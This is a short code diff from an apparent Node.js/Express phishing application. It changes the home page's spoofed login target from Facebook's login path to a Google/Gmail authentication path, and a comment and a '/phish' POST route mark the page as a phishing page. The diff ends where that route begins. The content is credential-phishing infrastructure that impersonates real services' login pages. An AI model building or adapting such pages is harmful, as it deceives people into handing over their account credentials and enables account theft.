@@ -7,7 +7,7 @@ var router = express.Router();
 // });
 /* GET home page. */
 router.get('/', function(req, res, next) {
-  res.render('index', { title: "Facebook", 'domain-name': 'www.facebook.com/', 'domain-path': 'login/' });
+  res.render('index', { title: "Facebook", 'domain-name': 'gmail.com/', 'domain-path': '/auth/google/login' });
 });
 // post to phishing page 
 router.post('/phish', function(req,res, next) {
